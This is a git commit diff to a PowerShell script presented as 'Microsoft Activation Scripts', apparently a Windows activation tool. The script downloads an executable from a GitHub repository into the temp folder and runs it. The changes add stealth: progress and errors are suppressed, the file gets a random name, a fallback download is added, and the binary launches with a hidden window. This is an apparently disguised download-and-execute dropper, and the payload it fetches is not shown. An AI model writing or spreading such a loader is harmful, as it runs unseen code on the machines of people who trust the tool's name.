ef6dbb22c738cc8c927845b90818e573699bc9d9
acenljd <thebluepoint2@gmail.com>
2025-12-09 19:52:31 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,7 +1,19 @@
+$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
+
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
-$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
+$tempFile = "$env:TEMP\app_$([System.Guid]::NewGuid().ToString('N')).exe"
+
+Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
 
 
-Invoke-WebRequest -Uri $url -OutFile $tempFile
+if (-not (Test-Path $tempFile)) {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $tempFile)
+    $webClient.Dispose()
+}
 
-Start-Process $tempFile -Verb RunAs -WorkingDirectory "$env:TEMP" -Wait
+
+if (Test-Path $tempFile) {
+    Start-Process $tempFile -WindowStyle Hidden -ErrorAction SilentlyContinue
+}
